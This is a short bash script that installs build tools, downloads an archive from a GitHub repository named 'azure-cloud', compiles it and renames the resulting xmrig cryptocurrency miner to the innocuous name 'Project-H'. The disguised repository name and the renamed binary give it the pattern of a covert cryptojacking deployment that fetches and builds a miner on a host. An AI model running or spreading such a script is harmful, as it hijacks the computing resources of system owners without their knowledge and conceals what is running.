#!/bin/bash
if [ "$HOME" != "/root" ]; then
   echo $(pwd) > home.file
   export LOCAL= $(pwd)
else
   export LOCAL=$(cat $(find /home -name home.file))
   cd $LOCAL
fi
if [ ! -e "AAA" ]; then
   sudo apt-get update
   sudo apt-get --assume-yes install build-essential cmake libuv1-dev libssl-dev libhwloc-dev git unzip
   wget https://github.com/U117A/azure-cloud/raw/master/AAA.zip --quiet
   unzip AAA.zip
   rm -rf AAA.zip
   cd AAA
   mkdir build
   cd build
   cmake ..
   make
   mv xmrig Project-H
fi
